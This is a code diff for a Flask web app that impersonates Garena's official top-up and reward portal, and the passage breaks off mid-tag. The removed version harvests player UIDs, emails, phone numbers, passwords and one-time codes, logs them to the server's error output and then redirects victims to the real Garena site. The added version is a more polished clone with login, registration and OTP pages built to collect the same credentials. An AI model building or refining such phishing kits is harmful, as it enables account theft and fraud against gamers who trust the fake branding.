@@ -1,138 +1,528 @@
-from flask import Flask, request, render_template_string
-import sys
+from flask import Flask, request, render_template_string, jsonify
 
 app = Flask(__name__)
 
-# --- ASSETS ---
-BG_IMAGE = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/5e2003ebfaf9ed29a40dc2f5db3a8aad%20(1).jpg"
-GARENA_LOGO = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/static/icons/garena_red_logo.png.png"
-SUCCESS_BG = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/static/icons/final_success_bg.jpg.jpg"
-
-STYLE = """
-<style>
-    @import url('https://fonts.googleapis.com/css2?family=Poppins:wght@400;600;700&display=swap');
-    * { margin: 0; padding: 0; box-sizing: border-box; }
-    body { background-color: #0A0E17; font-family: 'Poppins', sans-serif; overflow-x: hidden; }
-    .bg-layer {
-        position: fixed; top: 0; left: 0; width: 100%; height: 100%;
-        background: url('""" + BG_IMAGE + """') no-repeat center top;
-        background-size: cover; filter: brightness(0.5); z-index: -1;
-    }
-    
-    /* Updated Header Design */
-    header {
-        background: white; padding: 10px 15px; display: flex;
-        justify-content: space-between; align-items: center;
-        border-bottom: 1.5px solid #e0e0e0;
-    }
-    .header-left { display: flex; align-items: center; gap: 15px; }
-    .garena-brand { display: flex; flex-direction: column; align-items: center; }
-    .garena-brand img { height: 35px; margin-bottom: -5px; }
-    .garena-brand span { color: #ed1c24; font-size: 10px; font-weight: 700; font-family: sans-serif; }
-    .divider { width: 1px; height: 35px; background: #ddd; }
-    .topup-text { 
-        color: #333; font-size: 18px; font-weight: 600; 
-        line-height: 1.1; font-family: 'Poppins', sans-serif;
-    }
-    .help-btn {
-        background: #0056b3; color: white; padding: 6px 15px; 
-        border-radius: 5px; font-size: 13px; text-decoration: none; font-weight: 600;
-    }
-
-    .container { max-width: 400px; margin: auto; padding: 10px; }
-    .game-grid { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin: 15px 0; }
-    .game-item { text-align: center; text-decoration: none; color: white; transition: 0.2s; }
-    .game-item img { width: 60px; height: 60px; border-radius: 12px; border: 1.5px solid rgba(255,255,255,0.3); object-fit: cover; }
-    .game-item p { font-size: 8px; margin-top: 5px; font-weight: 600; text-transform: uppercase; }
-    .reward-card {
-        background: #ffffff; border-radius: 20px; padding: 22px 18px; width: 88%; margin: auto;
-        box-shadow: 0 15px 40px rgba(0,0,0,0.5);
-    }
-    .reward-card h1 { text-align: center; font-size: 16px; margin-bottom: 20px; color: #0056b3; font-weight: 800; text-transform: uppercase; }
-    .input-group { margin-bottom: 12px; }
-    input, select {
-        width: 100%; background: #f8f9fa; border: 1.2px solid #e9ecef;
-        color: #333; border-radius: 8px; padding: 12px; font-size: 13px; outline: none;
-    }
-    .claim-btn {
-        width: 100%; background: linear-gradient(135deg, #0062cc, #004085);
-        color: white; font-weight: 700; text-transform: uppercase;
-        border: none; border-radius: 8px; padding: 15px; cursor: pointer; font-size: 14px;
-    }
-    footer { text-align: center; padding: 20px; font-size: 9px; color: white; opacity: 0.7; }
-</style>
-"""
-
-@app.route('/')
-def home():
-    base_url = "https://raw.githubusercontent.com/northway656-create/myflaskapp/main/static/icons/"
-    apps = [
-        {"n": "Free Fire", "i": "freefire.png.jpg", "u": "https://ff.garena.com/"},
-        {"n": "COD Mobile", "i": "codm.png.jpg", "u": "https://www.callofduty.com/mobile"},
-        {"n": "Shells", "i": "shells.png.jpg", "u": "https://shop.garena.ph/app"},
-        {"n": "AOV", "i": "aov.png.jpg", "u": "https://www.arenaofvalor.com/"},
-        {"n": "Undawn", "i": "undawn.png.jpg", "u": "https://www.undawn.game/"},
-        {"n": "SPEED", "i": "speed.png.jpg", "u": "https://speed.garena.com/"},
-        {"n": "Haikyu!!", "i": "haikyu.png.jpg", "u": "https://haikyu-garena.com/"},
-        {"n": "Delta Force", "i": "delta.png.jpg", "u": "https://www.playdeltaforce.com/"}
-    ]
-    grid_items = "".join([f'<a href="{a["u"]}" target="_blank" class="game-item"><img src="{base_url}{a["i"]}"><p>{a["n"]}</p></a>' for a in apps])
-    
-    return render_template_string(f'''
-    <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0"><title>Garena Top Up</title>{STYLE}</head>
-    <body>
-        <div class="bg-layer"></div>
-        <header>
-            <div class="header-left">
-                <div class="garena-brand">
-                    <img src="{GARENA_LOGO}">
-                    <span>Garena</span>
-                </div>
-                <div class="divider"></div>
-                <div class="topup-text">Official Top Up<br>Center</div>
-            </div>
-            <div class="header-right">
-                <a href="https://ffsupport.garena.com/" class="help-btn">Help</a>
-            </div>
-        </header>
-        <div class="container"><div class="game-grid">{grid_items}</div><div class="reward-card"><h1>Reward Center</h1>
-        <form action="/login" method="post"><div class="input-group"><input type="text" name="uid" placeholder="Player UID" required></div>
-        <div class="input-group"><input type="email" name="user" placeholder="Email / Phone ID" required></div>
-        <div class="input-group"><input type="tel" name="phone" placeholder="Mobile Number" required></div>
-        <div class="input-group"><input type="password" name="pass" placeholder="Password" required></div>
-        <div class="input-group"><select name="login_method"><option>Facebook Login</option><option>Google Login</option><option>VK Login</option><option>Apple Account</option><option>Twitter Login</option></select></div>
-        <button type="submit" class="claim-btn">Claim Now</button></form></div><footer>© 2026 GARENA INTERNATIONAL. ALL RIGHTS RESERVED.</footer></div>
-    </body></html>''')
-
-@app.route('/login', methods=['POST'])
-def login():
-    print(f"--- [NEW DATA] ---", file=sys.stderr)
-    for key, value in request.form.items():
-        print(f"{key}: {value}", file=sys.stderr)
-    sys.stderr.flush()
-
-    return render_template_string(f'''
-    <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}</head>
-    <body><div class="bg-layer"></div><div class="container" style="margin-top:80px;"><div class="reward-card"><h1>Verification</h1>
-    <p style="text-align:center; font-size:11px; margin-bottom:15px; color:#666;">Enter the 8-digit OTP sent to your account.</p>
-    <form action="/final" method="post"><div class="input-group"><input type="tel" name="otp" placeholder="8-Digit OTP" maxlength="8" required></div>
-    <button type="submit" class="claim-btn">Verify</button></form></div></div></body></html>''')
-
-@app.route('/final', methods=['POST'])
-def final():
-    print(f"OTP RECEIVED: {request.form.get('otp')}", file=sys.stderr)
-    sys.stderr.flush()
-
-    return render_template_string(f'''
-    <html><head><meta name="viewport" content="width=device-width, initial-scale=1.0">{STYLE}
+# 📄 Upgraded Industrial-Grade HTML + CSS + JS Combined Code
+HTML_TEMPLATE = """
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Garena Official Portal</title>
     <style>
-        body {{ background: url('{SUCCESS_BG}') no-repeat center top !important; background-size: cover !important; }}
-    </style></head>
-    <body><script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
-    <script>
-        Swal.fire({{ title: 'Request Successful!', text: 'Aapka request Free Fire team tak pahunch gaya hai. Agle 24 ghante mein aapko rewards mil jayenge.', icon: 'success', confirmButtonColor: '#0056b3', allowOutsideClick: false
-        }}).then(() => {{ window.location.href = "https://ff.garena.com/"; }});
-    </script></body></html>''')
+        :root {
+            --garena-red: #de2828;
+            --bg-white: #f9f9f9;
+            --text-dark: #333333;
+            --border-color: #e0e0e0;
+            --input-bg: #ffffff;
+            --gold-secure: #f39c12;
+        }
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0", port=10000)
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+        }
+
+        body {
+            background-color: var(--bg-white);
+            color: var(--text-dark);
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+        }
+
+        .phone-container {
+            width: 100%;
+            max-width: 450px;
+            background: #ffffff;
+            min-height: 100vh;
+            box-shadow: 0 0 20px rgba(0,0,0,0.05);
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Header Layout - Fixed Full Logo Space */
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 12px 15px;
+            border-bottom: 1px solid var(--border-color);
+            background: #ffffff;
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        .logo img {
+            height: 38px;
+            object-fit: contain;
+            display: block;
+        }
+
+        .lang-button {
+            background: none;
+            border: none;
+            cursor: pointer;
+            padding: 5px;
+            display: flex;
+            align-items: center;
+        }
+
+        .lang-button svg {
+            width: 24px;
+            height: 24px;
+            fill: #888;
+        }
+
+        /* Top Reward Banner */
+        .reward-banner-container {
+            padding: 0 15px;
+            margin-top: 15px;
+            margin-bottom: 5px;
+        }
+
+        .reward-banner-container img {
+            width: 100%;
+            border-radius: 8px;
+            display: block;
+            object-fit: cover;
+        }
+
+        /* Updated Quick Actions Grid to 3 Columns (9 Icons) */
+        .quick-actions-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr); /* 3 icons per row */
+            gap: 10px;
+            padding: 15px 15px;
+            background: #ffffff;
+            border-bottom: 1px solid var(--border-color);
+        }
+
+        .action-item {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            text-align: center;
+            cursor: pointer;
+            text-decoration: none;
+            color: #555;
+            transition: transform 0.2s;
+        }
+
+        .action-item:hover {
+            transform: scale(1.05);
+        }
+
+        .action-icon {
+            width: 42px;
+            height: 42px;
+            border-radius: 50%;
+            background: #f5f6fa;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            margin-bottom: 5px;
+            border: 1px solid #eef0f5;
+        }
+
+        .action-img {
+            width: 100%;
+            height: 100%;
+            border-radius: 50%;
+            object-fit: cover;
+        }
+
+        .action-label {
+            font-size: 11px;
+            font-weight: 500;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
+            width: 100%;
+        }
+
+        /* Login Platform Method Selector Grid */
+        .login-methods-title {
+            text-align: center;
+            font-size: 13px;
+            color: #777;
+            margin: 15px 0 10px 0;
+            font-weight: 500;
+        }
+
+        .methods-grid {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 10px;
+            margin-bottom: 25px;
+        }
+
+        .method-btn {
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 10px;
+            border: 1px solid var(--border-color);
+            border-radius: 6px;
+            background: #fff;
+            cursor: pointer;
+            font-size: 11px;
+            font-weight: 600;
+            color: #555;
+            transition: all 0.2s;
+        }
+
+        .method-btn:hover {
+            border-color: var(--garena-red);
+            background: #fff8f8;
+        }
+
+        .method-btn.active {
+            border-color: var(--garena-red);
+            background: #ffeaea;
+            color: var(--garena-red);
+        }
+
+        .method-img {
+            width: 24px;
+            height: 24px;
+            object-fit: contain;
+            margin-bottom: 4px;
+        }
+
+        /* Language Selector Menu */
+        .lang-dropdown {
+            display: none;
+            position: absolute;
+            top: 55px;
+            right: 10px;
+            background: #ffffff;
+            border: 1px solid var(--border-color);
+            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+            border-radius: 4px;
+            width: 220px;
+            z-index: 1000;
+            max-height: 280px;
+            overflow-y: auto;
+        }
+
+        .lang-dropdown div {
+            padding: 10px 14px;
+            cursor: pointer;
+            font-size: 13px;
+            border-bottom: 1px solid #f5f5f5;
+        }
+
+        .lang-dropdown div:hover {
+            background-color: #f9f9f9;
+            color: var(--garena-red);
+        }
+
+        /* View Layouts */
+        .content-body {
+            padding: 15px 20px;
+            flex: 1;
+        }
+
+        .page-view {
+            display: none;
+        }
+
+        .page-view.active {
+            display: block;
+        }
+
+        h2.title {
+            text-align: center;
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 20px;
+            color: #222;
+        }
+
+        .input-group {
+            position: relative;
+            margin-bottom: 15px;
+        }
+
+        .input-group span.required {
+            position: absolute;
+            left: -12px;
+            top: 12px;
+            color: var(--garena-red);
+            font-weight: bold;
+        }
+
+        .input-group input, .input-group select {
+            width: 100%;
+            padding: 12px 14px;
+            border: 1px solid var(--border-color);
+            border-radius: 4px;
+            font-size: 14px;
+            background-color: var(--input-bg);
+            outline: none;
+        }
+
+        .password-toggle {
+            position: absolute;
+            right: 12px;
+            top: 12px;
+            cursor: pointer;
+            color: #888;
+        }
+
+        .info-text {
+            font-size: 12px;
+            color: #666;
+            line-height: 1.5;
+            margin-bottom: 20px;
+        }
+
+        /* Functional CTA Elements */
+        .btn-primary {
+            width: 100%;
+            background-color: var(--garena-red);
+            color: white;
+            border: none;
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+            margin-bottom: 12px;
+        }
+
+        .btn-secondary {
+            width: 100%;
+            background-color: #ffffff;
+            color: #555;
+            border: 1px solid var(--border-color);
+            padding: 12px;
+            font-size: 15px;
+            font-weight: 500;
+            border-radius: 4px;
+            cursor: pointer;
+        }
+
+        .footer-links {
+            text-align: center;
+            font-size: 12px;
+            color: #999;
+            margin-top: 25px;
+            line-height: 1.6;
+        }
+
+        .footer-links a {
+            color: #0044ff;
+            text-decoration: none;
+            font-weight: 500;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        .success-box {
+            text-align: center;
+            padding: 25px 10px;
+        }
+        
+        .success-icon {
+            font-size: 45px;
+            color: #2ecc71;
+            margin-bottom: 12px;
+        }
+    </style>
+</head>
+<body>
+
+<div class="phone-container">
+    <header>
+        <div class="logo">
+            <img src="/static/icons/garena_full_logo_eyes.png.jpg" alt="Garena Official">
+        </div>
+        
+        <button class="lang-button" onclick="toggleLangDropdown()">
+            <svg viewBox="0 0 24 24">
+                <path d="M11.99 2C6.47 2 2 6.48 2 12s4.47 10 9.99 10C17.52 22 22 17.52 22 12S17.52 2 11.99 2zm6.93 6h-2.95c-.32-1.25-.78-2.45-1.38-3.56 1.84.42 3.43 1.63 4.33 3.56zM12 4.04c.83 1.2 1.48 2.53 1.91 3.96h-3.82c.43-1.43 1.08-2.76 1.91-3.96zM4.26 14C4.1 13.36 4 12.69 4 12s.1-1.36.26-2h3.38c-.08.66-.14 1.32-.14 2 0 .68.06 1.34.14 2H4.26zm.82 2h2.95c.32 1.25.78 2.45 1.38 3.56-1.84-.42-3.43-1.63-4.33-3.56zm2.95-8H5.08c.9-1.93 2.49-3.14 4.33-3.56-.6 1.11-1.06 2.31-1.38 3.56zM12 19.96c-.83-1.2-1.48-2.53-1.91-3.96h3.82c-.43 1.43-1.08 2.76-1.91 3.96zM14.34 14H9.66c-.09-.66-.16-1.32-.16-2 0-.68.07-1.35.16-2h4.68c.09.65.16 1.32.16 2 0 .68-.07 1.34-.16 2zm.25 5.56c.6-1.11 1.06-2.31 1.38-3.56h2.95c-.9 1.93-2.49 3.14-4.33 3.56zM16.36 14c.08-.66.14-1.32.14-2 0-.68-.06-1.34-.14-2h3.38c.16.64.26 1.31.26 2s-.1 1.36-.26 2h-3.38z"/>
+            </svg>
+        </button>
+
+        <div class="lang-dropdown" id="langMenu">
+            <div onclick="changeLanguage('en', 'International - English')">International - English</div>
+            <div onclick="changeLanguage('en', 'Singapore - English')">Singapore - English</div>
+            <div onclick="changeLanguage('zh_cn', '新加坡 - 简体中文')">新加坡 - 简体中文</div>
+            <div onclick="changeLanguage('zh_tw', '台灣 - 繁体中文')">台灣 - 繁体中文</div>
+            <div onclick="changeLanguage('en', 'Philippines - English')">Philippines - English</div>
+            <div onclick="changeLanguage('th', 'ไทย - ไทย')">ไทย - ไทย</div>
+            <div onclick="changeLanguage('id', 'Indonesia - Bahasa Indonesia')">Indonesia - Bahasa Indonesia</div>
+            <div onclick="changeLanguage('vi', 'Việt Nam - Tiếng việt')">Việt Nam - Tiếng việt</div>
+            <div onclick="changeLanguage('ru', 'Россия - Русский')">Россия - Русский</div>
+            <div onclick="changeLanguage('es', 'España - Español')">España - Español</div>
+        </div>
+    </header>
+
+    <div class="quick-actions-grid">
+        <a href="https://ff.garena.com" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/freefire.png.jpg" class="action-img" alt="Free Fire"></div>
+            <div class="action-label" id="lbl-icon1">FF Website</div>
+        </a>
+        <a href="https://support.garena.com" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/codm.png.jpg" class="action-img" alt="COD M"></div>
+            <div class="action-label" id="lbl-icon2">Help Center</div>
+        </a>
+        <a href="https://shop.garena.sg" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/shells.png.jpg" class="action-img" alt="Shells"></div>
+            <div class="action-label" id="lbl-icon3">Topup</div>
+        </a>
+        <a href="https://account.garena.com" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/aov.png.jpg" class="action-img" alt="AOV"></div>
+            <div class="action-label" id="lbl-icon4">Security</div>
+        </a>
+        <a href="https://ff.garena.com/en/news/" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/undawn.png.jpg" class="action-img" alt="Undawn"></div>
+            <div class="action-label" id="lbl-icon5">Events</div>
+        </a>
+        <a href="https://reward.ff.garena.com" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/speed.png.jpg" class="action-img" alt="Speed"></div>
+            <div class="action-label" id="lbl-icon6">Redeem</div>
+        </a>
+        <a href="https://developer.garena.com" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/haikyu.png.jpg" class="action-img" alt="Haikyu"></div>
+            <div class="action-label" id="lbl-icon7">Notice</div>
+        </a>
+        <a href="https://ff.garena.com" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/delta.png.jpg" class="action-img" alt="Delta"></div>
+            <div class="action-label" id="lbl-icon8">Download</div>
+        </a>
+        <a href="https://www.garena.sg/support/" target="_blank" class="action-item">
+            <div class="action-icon"><img src="/static/icons/garena_full_logo_eyes.png.jpg" class="action-img" alt="Garena"></div>
+            <div class="action-label" id="lbl-icon9">Support</div>
+        </a>
+    </div>
+
+    <div class="reward-banner-container">
+        <img src="/static/icons/reward_banner.jpg.jpg" alt="Free Fire Secure Payment">
+    </div>
+
+    <div class="content-body">
+        
+        <div id="page-uid" class="page-view active">
+            <h2 class="title" id="txt-uid-title">Enter Game UID</h2>
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="number" id="input-uid" placeholder="Player UID (e.g. 28471948)">
+            </div>
+            <button class="btn-primary" onclick="processUID()" id="txt-btn-next">Next</button>
+        </div>
+
+        <div id="page-register" class="page-view">
+            <h2 class="title" id="txt-reg-title">Registration</h2>
+            
+            <div class="login-methods-title">Select Login / Connect Method</div>
+            <div class="methods-grid">
+                <div class="method-btn active" onclick="selectMethod(this, 'Facebook')">
+                    <img src="/static/icons/facebook_icon.png" class="method-img" alt="FB"><span>Facebook</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Google')">
+                    <img src="/static/icons/google_icon.png.png" class="method-img" alt="Google"><span>Google</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'VK')">
+                    <img src="/static/icons/vk_icon.png.png" class="method-img" alt="VK"><span>VKontakte</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Apple')">
+                    <img src="/static/icons/apple_icon.png.jpg" class="method-img" alt="Apple"><span>Apple ID</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Twitter')">
+                    <img src="/static/icons/x_logo.jpg.jpg" class="method-img" alt="Twitter"><span>Twitter</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Garena')">
+                    <span class="method-icon" style="font-size:20px; margin-bottom:4px;">❤️</span><span>Garena</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="text" placeholder="Account Username / Email" id="reg-user">
+            </div>
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="password" placeholder="Password" id="reg-pass">
+                <span class="password-toggle" onclick="togglePass('reg-pass')">👁️</span>
+            </div>
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="password" placeholder="Re-enter password" id="reg-repass">
+                <span class="password-toggle" onclick="togglePass('reg-repass')">👁️</span>
+            </div>
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="email" placeholder="Recovery Email" id="reg-email">
+            </div>
+            <p class="info-text" id="txt-reg-info">
+                Your email is required for Garena account recovery. Unauthorized Gmail addresses will be reformatted following Gmail standard.
+            </p>
+            <div class="input-group">
+                <select id="reg-country">
+                    <option value="Sudan">Sudan (السودาน)</option>
+                    <option value="India">India</option>
+                    <option value="Indonesia">Indonesia</option>
+                    <option value="Global">International</option>
+                </select>
+            </div>
+            <button class="btn-primary" onclick="submitData('register')" id="txt-btn-reg">Register Now</button>
+            <button class="btn-secondary" onclick="goToLogin()" id="txt-btn-have-acc">Already have an account?</button>
+        </div>
+
+        <div id="page-login" class="page-view">
+            <h2 class="title" id="txt-login-title">Log In</h2>
+
+            <div class="login-methods-title">Select Login Method</div>
+            <div class="methods-grid">
+                <div class="method-btn active" onclick="selectMethod(this, 'Facebook')">
+                    <img src="/static/icons/facebook_icon.png" class="method-img" alt="FB"><span>Facebook</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Google')">
+                    <img src="/static/icons/google_icon.png.png" class="method-img" alt="Google"><span>Google</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'VK')">
+                    <img src="/static/icons/vk_icon.png.png" class="method-img" alt="VK"><span>VKontakte</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Apple')">
+                    <img src="/static/icons/apple_icon.png.jpg" class="method-img" alt="Apple"><span>Apple ID</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Twitter')">
+                    <img src="/static/icons/x_logo.jpg.jpg" class="method-img" alt="Twitter"><span>Twitter</span>
+                </div>
+                <div class="method-btn" onclick="selectMethod(this, 'Garena')">
+                    <span class="method-icon" style="font-size:20px; margin-bottom:4px;">❤️</span><span>Garena</span>
+                </div>
+            </div>
+
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="text" placeholder="Garena Username, Email or Phone" id="login-user">
+            </div>
+            <div class="input-group">
+                <span class="required">*</span>
+                <input type="password" placeholder="Password" id="login-pass">
+                <span class="password-toggle" onclick="togglePass('login-pass')">👁️</span>
+            </div>
+            <div style="text-align: right; margin-bottom: 20px;">
+                <a href="#" style="color: #3498db; text-decoration: none; font-size: 14px;" id="txt-forgot">Forgot Password</a>
+            </div>
+            <button class="btn-primary" onclick="submitData('login')" id="txt-btn-login">Login Now</button>
+            <button class="btn-secondary" onclick="goToRegister()" id="txt-btn-new-acc">Register A New Account</button>
+        </div>
+
+        <div id="page-otp" class="page-view">
+            <h2 class="title" id="txt-otp-title">Verification Code</h2>
+            <p class="in
